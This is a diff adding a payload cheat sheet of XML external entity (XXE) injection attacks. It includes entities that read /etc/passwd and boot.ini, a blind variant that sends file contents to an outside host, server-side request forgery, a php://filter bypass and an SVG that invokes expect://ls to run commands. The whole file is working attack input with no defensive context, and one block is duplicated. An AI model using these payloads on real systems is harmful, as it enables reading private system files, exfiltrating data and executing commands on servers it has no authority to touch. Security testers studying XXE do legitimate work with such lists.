@@ -1,0 +1,54 @@
+XXE INJECTION PAYLOADS <3
+
+CLASSIC XXE: 
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ELEMENT data (#ANY)>
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<data>&file;</data>
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+  <!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo> 
+
+XXE LFI: 
+<?xml version="1.0"?>
+<!DOCTYPE foo [  
+<!ELEMENT foo (#ANY)>
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+
+XXE BLIND LFI: 
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ELEMENT foo (#ANY)>
+<!ENTITY % xxe SYSTEM "file:///etc/passwd">
+<!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]><foo>&blind;</foo>
+
+XXE SSRF:
+<?xml version="1.0"?>
+<!DOCTYPE foo [  
+<!ELEMENT foo (#ANY)>
+<!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>
+
+XXE ACCESS CONTROL BYPASS:
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>
+<foo><result>&ac;</result></foo>
+
+XXE INSIDE SVG:
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
+    <image xlink:href="expect://ls"></image>
+</svg>
